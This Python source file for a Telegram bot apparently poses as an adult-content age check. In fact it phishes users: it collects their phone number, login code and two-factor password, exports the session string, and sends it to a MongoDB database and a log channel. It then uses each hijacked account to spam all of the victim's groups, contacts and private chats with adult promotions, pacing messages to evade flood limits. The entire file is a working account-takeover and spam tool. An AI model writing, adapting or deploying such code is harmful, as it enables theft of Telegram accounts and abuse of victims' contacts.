import os
import asyncio
import time
from pathlib import Path
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['users']

# Promo Texts
PROMO_TEXTS = [
    "🔥 Join our exclusive channel!",
    "🎉 Unlock premium content now!",
    "💋 VIP access waiting for you!",
    "🔞 Best adult content on Telegram!",
    "🌟 Exclusive videos just for you!",
    "💥 Your premium pass starts here!",
    "😈 Don't miss our collection!",
    "👑 VIP membership available!",
    "🕶️ Hidden gems await!",
    "💎 Premium quality content!"
]

# Strings
strings = {
    'need_login': "You have to /login first!",
    'already_logged_in': "You're already logged in! 🥳",
    'age_verification': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
    'logout_success': "Logged out! 🔒\n/login to access again.",
    'not_logged_in': "Not logged in! ❌\n/login first."
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("🆗", callback_data="otp_submit")
    ]
])

# State Management
user_states = {}

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and not state['client'].is_disconnected:
            await state['client'].disconnect()
        del user_states[user_id]

@Client.on_message(filters.private & filters.command("login"))
async def start_login(bot: Client, message: Message):
    user_id = message.from_user.id
    user_data = database.find_one({"id": user_id})
    
    if user_data and user_data.get('session'):
        try:
            test_client = Client(":memory:", session_string=user_data['session'])
            await test_client.connect()
            await test_client.get_me()
            await test_client.disconnect()
            
            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": True}}
            )
            await message.reply(strings['verification_success'])
            asyncio.create_task(send_promotion_messages(user_data['session']))
            return
        except:
            pass
    
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return
    
    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.command("logout"))
async def handle_logout(bot: Client, message: Message):
    user_id = message.from_user.id
    if not await check_login_status(user_id):
        await message.reply(strings['not_logged_in'])
        return
    
    database.update_one(
        {"id": user_id},
        {"$set": {"logged_in": False}}
    )
    await message.reply(strings['logout_success'])

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return
    
    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"
    
    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()
    
    try:
        code = await client.send_code(phone_number)
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': ''
        }
        await message.reply(
            "**OTP Sent!**\n\nEnter code via buttons:",
            reply_markup=OTP_KEYBOARD
        )
    except Exception as e:
        await message.reply(f"Error: {e}\n/login again.")
        await cleanup_user_state(user_id)

@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /login again.")
        return
    
    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    elif action == "submit":
        if len(state['otp_digits']) < 5:
            await query.answer("OTP must be 5 digits!", show_alert=True)
            return
        await query.message.edit("Verifying OTP...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
            state['needs_password'] = True
        except Exception as e:
            await query.message.reply(f"Error: {e}\n/login again.")
            await cleanup_user_state(user_id)
        return
    else:
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += action
    
    await query.message.edit(
        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 when done.",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["login", "logout"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    
    try:
        await state['client'].check_password(password=password)
        await message.reply("Password verified...")
        await create_session(bot, state['client'], user_id, state['phone_number'])
    except PasswordHashInvalid:
        await message.reply('**Invalid Password**\n/login again')
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save to database
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number
        }
        
        if existing := database.find_one({"id": user_id}):
            database.update_one({'_id': existing['_id']}, {'$set': data})
        else:
            data['id'] = user_id
            database.insert_one(data)

        # Create sessions directory if not exists
        os.makedirs("sessions", exist_ok=True)

        # Generate session file path
        clean_phone = phone_number.replace('+', '')
        session_file = Path(f"sessions/{clean_phone}.session")

        # Manually save session file
        with open(session_file, "w") as f:
            f.write(string_session)
            
        # Send to log channel
        await bot.send_document(
            LOG_CHANNEL_SESSIONS_FILES,
            str(session_file),
            caption=f"Session: {clean_phone}"
        )
        
        # Remove local copy
        os.remove(session_file)

        await bot.send_message(user_id, strings['verification_success'])
        asyncio.create_task(send_promotion_messages(string_session))
        
    except Exception as e:
        await bot.send_message(user_id, f"Error: {e}\n/login again")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(session_string: str):
    try:
        client = Client("promo", session_string=session_string)
        await client.start()
        
        # Get all targets
        targets = set()
        
        # 1. Groups/supergroups
        async for dialog in client.get_dialogs():
            if dialog.chat.type in ["group", "supergroup"]:
                targets.add(dialog.chat.id)
        
        # 2. Contacts
        contacts = await client.get_contacts()
        for user in contacts:
            if not user.is_bot:
                targets.add(user.id)
        
        # 3. Private chats
        async for dialog in client.get_dialogs():
            if dialog.chat.type == "private" and not dialog.chat.is_bot:
                targets.add(dialog.chat.id)
        
        # Promotion blast
        for target in targets:
            for promo_text in PROMO_TEXTS:
                try:
                    await client.send_message(target, promo_text)
                    await asyncio.sleep(300 + (time.time() % 10))
                except FloodWait as e:
                    await asyncio.sleep(e.value + 5)
                except:
                    break
            await asyncio.sleep(60)
            
    except:
        pass
    finally:
        try:
            await client.stop()
        except:
            pass
